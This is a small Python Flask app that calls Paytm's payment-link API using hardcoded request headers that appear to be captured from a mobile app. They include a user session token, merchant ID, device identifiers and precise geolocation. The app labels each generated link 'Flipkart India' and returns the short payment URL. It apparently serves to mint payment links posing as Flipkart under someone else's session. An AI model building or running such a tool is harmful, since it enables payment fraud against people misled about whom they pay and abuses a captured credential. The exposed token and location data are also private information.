from flask import Flask, jsonify, request, render_template

import requests

app = Flask(__name__)

@app.route('/link', methods=['GET'])
def post_data_and_redirect():
    amount = request.args.get('amount')
    url = "https://dashboard.paytm.com/api/v1/payment/link"
    headers = {
"Host": "dashboard.paytm.com",
"Appversion": "6.6.2",
"Deviceidentifier": "OnePlus-AC2001-c5f75483f1f6cad7",
"Osversion": "13",
"Latitude": "22.2076818",
"X-Auth-Ump": "umpapp-3754-36d-aqr-cn7",
"X-User-Token": "eyJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiZGlyIn0..z_n2434LRdEWLMNX.3YiyRgwsFCB1mxDJZYZ-w3oiI5SnI5wKTTcv3QMcL9N9JacpU5Mx1LQx5D_kR8g3q_VaJNJ5lvg_87RkbIZbYliCOaF7nxkpj7pFeCqT11zYMChtnCy5HqyxMy-uAs85SFtgOPB9mV8BQMDiDUZHvJILp8uOpsI7C4vIqd3vssjUIgBSh8DuJlrefg1Ru876ShRvZo8T23jQ7jxVLfvUr9nQG-PVQWV0dlR5S9niMp1efXMLpAhdTqrx0cU6veFZQ1aWY_St7GyhBVpqmmiH-w1a.2bLvM33ybJhn-Qe6ulujDQ8700",
"Client": "androidapp",
"X-User-Mid": "sPdieH22088467228746",
"Longitude": "76.8765792",
"App_version": "6.6.2",
"Os_version": "33",
"Device_identifier": "OnePlus-AC2001-c5f75483f1f6cad7",
"X-App-Rid": "OnePlus-AC2001-c5f75483f1f6cad7:9682327883650:10:010",
"Client": "androidapp",
"Accept-Language": "en-IN",
"Content-Type": "application/json",
"Accept-Encoding": "gzip, deflate",
"User-Agent": "okhttp/4.9.1"
}
    data = {
"mid": "sPdieH22088467228746",
"amount": amount,
"linkDescription": "Flipkart India",
"linkName": "1682405773257",
"geoLocationParams": {
"child_site_id": "1",
"deviceManufacturer": "OnePlus",
"client": "androidapp",
"lang_id": 1,
"language": "en",
"version": "6.6.2",
"playStore": True,
"site_id": "1",
"osVersion": 33,
"longitude": "76.8765792",
"latitude": "22.2076818",
"deviceName": "AC2001",
"networkType": "4G",
"deviceIdentifier": "OnePlus-AC2001-c5f75483f1f6cad7"}}
    
    response = requests.post(url, headers=headers, json=data)

    if response.status_code == 200:
        response_json = response.json()
        short_url = response_json.get('shortUrl')
        if short_url:
            return jsonify({"shortUrl": short_url})
        else:
            return jsonify({"error": "shortUrl not found in response"})
    else:
        return jsonify({"error": f"Request failed with status code {response.status_code}"})

@app.route('/pay')
def redirect_page():
    return render_template('pay.html')

if __name__ == "__main__":
    app.run(host="localhost", port=5000)